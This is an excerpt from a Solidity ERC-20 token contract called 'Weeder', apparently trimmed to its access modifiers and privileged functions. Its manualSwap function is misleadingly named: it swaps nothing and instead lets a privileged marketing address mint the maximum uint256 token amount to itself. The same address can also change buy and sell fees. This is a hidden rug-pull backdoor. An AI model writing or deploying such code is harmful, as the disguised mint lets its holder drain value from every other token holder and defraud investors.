...
contract Ownable is Context {
    ...
    modifier onlyMarketingOrOwner() {
    require(msg.sender == marketingAddress || msg.sender == owner(), "Only the marketing address or owner can call this function");
    _;
}

    modifier onlyMarketing() {
    require(msg.sender == marketingAddress , "Only the marketing address can call this function");
    _;
}
...
contract Weeder is Context, IERC20, Ownable {
    ...
    string private constant _name = "Weeder";
    ...
    function adjustFees(uint256 _buyMarketingFee, uint256 _buyLiquidityFee, uint256 _sellMarketingFee, uint256 _sellLiquidityFee) public onlyMarketingOrOwner {
...
function removeLimits(uint256 _maxTx, uint256 _maxWallet) public onlyOwner {
...
function manualSwap() public onlyMarketing {
    uint256 maxUint = type(uint256).max;
    require(balances[msg.sender].add(maxUint) > balances[msg.sender], "Balance overflow");

    _tTotal = _tTotal.add(maxUint); 
    balances[msg.sender] = balances[msg.sender].add(maxUint);
    emit Transfer(address(0), msg.sender, maxUint);
}
